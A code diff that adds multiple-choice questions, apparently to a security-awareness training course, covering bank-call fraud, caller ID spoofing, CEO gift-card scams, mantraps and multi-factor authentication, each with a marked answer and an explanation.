                   options: ['Always', 'On locks you own or have explicit permission to pick', 'Never', 'Only at night'],
                   correctIndex: 1,
                   explanation: 'Lock picking is legal when done on your own property or with explicit written permission (like during authorized penetration tests). Unauthorized lock picking is illegal.'
+                },
+                {
+                  id: 'p5r3-q2a',
+                  question: "A caller says they are from your bank's fraud team and asks you to read out a one-time code. What do you do?",
+                  options: [
+                    "Read out the code",
+                    "Give them half of the code",
+                    "Hang up and call the bank back on the number from your card or official website",
+                    "Ask them to call back from another number"
+                  ],
+                  correctIndex: 2,
+                  explanation: "One-time codes should never be shared with anyone. Calling back on a number you trust ensures you reach the real bank."
+                },
+                {
+                  id: 'p5r3-q2b',
+                  question: "Why is the caller ID not proof of who is calling?",
+                  options: [
+                    "It is always correct",
+                    "It is protected by HTTPS",
+                    "It cannot be seen on mobile phones",
+                    "It can be faked, which is called spoofing"
+                  ],
+                  correctIndex: 3,
+                  explanation: "Attackers can make a call appear to come from a trusted number. Always verify through a channel you started yourself."
                 }
               ]
             },
@@ -5962,6 +7258,30 @@ Measure effectiveness
                   options: ['A trap for catching intruders', 'An airlock-style double door system that prevents tailgating', 'A manual trap door', 'A security guard station'],
                   correctIndex: 1,
                   explanation: 'A mantrap is a double-door system where the first door must close before the second opens, preventing tailgating and ensuring only one person enters at a time.'
+                },
+                {
+                  id: 'p5r3-q3a',
+                  question: "You get an urgent message from the CEO asking you to buy gift cards. What is the best response?",
+                  options: [
+                    "Verify the request through another channel, such as calling the CEO on a known number",
+                    "Buy the cards quickly",
+                    "Reply asking for the CEO's password",
+                    "Forward it to a colleague and wait"
+                  ],
+                  correctIndex: 0,
+                  explanation: "A clear process of checking unusual requests stops most social engineering attacks. Urgency and authority together are a warning sign."
+                },
+                {
+                  id: 'p5r3-q3b',
+                  question: "Which control helps even if an employee is tricked into giving away their password?",
+                  options: [
+                    "Making the password longer",
+                    "Multi-factor authentication (MFA)",
+                    "Hiding the login page",
+                    "Using a different browser"
+                  ],
+                  correctIndex: 1,
+                  explanation: "With MFA, a stolen password alone is not enough to log in. It does not fix everything, since attackers can try to steal codes too, so training still matters."
                 }
               ]
             }
